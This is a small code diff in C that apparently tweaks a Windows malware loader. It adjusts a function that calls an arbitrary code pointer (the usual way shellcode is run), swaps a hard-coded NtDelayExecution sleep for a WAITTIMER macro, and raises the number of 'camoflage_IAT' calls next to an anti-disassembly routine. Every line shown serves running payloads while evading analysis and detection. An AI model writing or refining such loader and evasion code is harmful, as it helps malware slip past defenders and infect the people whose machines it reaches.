@@ -51,7 +51,7 @@ int _TIGER(HANDLE hMutant, PVOID Handler);
 NTAPI_FUNC _G_NTFUNC = { 0 };
 
 LPVOID RtlCallFunction(LPVOID lpparam) {
-	(*(LPVOID(*)())(lpparam))();
+	(*(LPVOID(WINAPI*)())(lpparam))();
 	return 0;
 }
 
@@ -73,7 +73,7 @@ int main(void) {
 
 	// example: -10000000 = 1sec relative to current :)
 	// Used by NtDelayExecution()
-	LONGLONG sleepTimer = -150000000;
+	LONGLONG sleepTimer = WAITTIMER;
 
 	// Anti-Disassembly
 	AntiDisassmConstantCondition();
@@ -86,7 +86,7 @@ int main(void) {
 	}
 
 	// Increase the number for longer operation
-	for (int i = 0; i < 3; i++) {
+	for (int i = 0; i < 4; i++) {
 		camoflage_IAT();
 	}
 
